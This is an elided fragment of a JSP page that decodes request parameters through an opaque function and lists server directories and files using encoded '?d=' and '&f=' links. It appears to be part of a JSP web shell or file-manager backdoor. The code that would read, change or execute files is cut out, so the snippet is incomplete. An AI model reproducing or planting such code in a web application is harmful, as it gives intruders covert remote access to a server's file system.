...
<%
    ...
    while (paramNames.hasMoreElements()) {
        ...
        if (paramValue != null && !paramValue.isEmpty()) {
            try {
                request.setAttribute("decoded_" + paramName, y(paramValue));
            } catch (Exception e) {
...
<hr>DIR: <%
    ...
    for (int i = 0; i < directories.length; i++) {
        ...
        if (i == 0) {
            out.print("/<a href=\"?d=" + x(currentPath) + "\">" + directories[i] + "</a>");
        } else {
            out.print("/<a href=\"?d=" + x(currentPath) + "\">" + directories[i] + "</a>");
        }
    }
%>
<a href="?d=<%= x(scriptDirectory) %>"> / <span style="color: green;">[ GO Home ]</span></a>
<br>
    ...
    if (files != null) {
        for (File file : files) {
            ...
            String itemLink = file.isDirectory() ? 
                "?d=" + x(currentDirectory + File.separator + itemName) : 
                "?d=" + x(currentDirectory) + "&f=" + x(itemName);
